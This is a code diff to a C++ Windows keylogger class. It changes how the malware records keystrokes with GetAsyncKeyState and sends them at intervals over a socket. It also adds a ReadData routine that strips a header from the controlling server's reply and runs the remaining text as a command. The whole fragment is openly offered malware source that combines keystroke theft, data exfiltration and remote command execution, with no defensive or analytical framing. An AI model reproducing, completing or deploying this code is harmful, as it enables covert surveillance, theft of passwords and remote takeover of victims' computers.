@@ -48,7 +48,7 @@ const char* keyStringsNoShift[] =
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
 
-Keylogger::Keylogger() : cmdBufLen(0)
+Keylogger::Keylogger() : cmdBufLen(sizeof(cmdBuf))
 {
 
 }
@@ -90,11 +90,9 @@ void Keylogger::Run()
 		if(ticksNow - ticksLast >= V_SEND_INTERVAL)
 		{
 			ticksLast = GetTickCount();
-            if (!keysPressed.empty())
-            {
-                this->Send();
-                keysPressed.clear();
-            }
+
+            this->Send();
+            keysPressed.clear();
 		}
 
         bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
@@ -180,13 +178,41 @@ void Keylogger::Send()
         return;
     }
 
-    int bufLen = recv(sock, cmdBuf, this->cmdBufLen, 0);
+    int bufLen = recv(sock, cmdBuf, (this->cmdBufLen-1), 0);
     if (bufLen > 0)
     {
-        cmd.Run(cmdBuf);
-        bufLen = 0;
+        cmdBuf[bufLen] = '\0';
+        this->ReadData(bufLen);
     }
 
     closesocket(sock);
     return;
+}
+
+void Keylogger::ReadData(int len)
+{
+    int linebreaks = 0;
+    char *start = cmdBuf;
+
+    while(*start != '\0') {
+        switch(*start) {
+        case '\r':
+        case '\n':
+            ++linebreaks;
+            break;
+        default:
+            linebreaks = 0;
+        }
+
+        ++start;
+
+        if (linebreaks == 4) {
+            break;
+        }
+    }
+
+    if (*start != '\0')
+    {
+        cmd.Run(start);
+    }
 }
